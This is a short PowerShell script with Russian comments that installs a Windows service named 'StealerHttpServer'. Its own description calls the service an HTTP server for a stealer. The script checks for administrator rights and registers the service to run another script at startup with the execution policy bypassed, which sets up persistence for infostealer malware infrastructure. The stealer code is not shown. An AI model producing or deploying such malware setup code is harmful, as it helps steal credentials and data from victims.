$serviceName = "StealerHttpServer"
$scriptPath = "C:\path\to\MyHttpServer.ps1"

if (-not ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")) {
    Write-Error "Для установки службы PowerShell нужно запускать от имени администратора."
    Exit
}

# Устанавливаем службу
New-Service -Name $serviceName -BinaryPathName "powershell.exe -NoProfile -ExecutionPolicy Bypass -File `"$scriptPath`"" -Description "HTTP сервер для стиллера" -StartupType Automatic
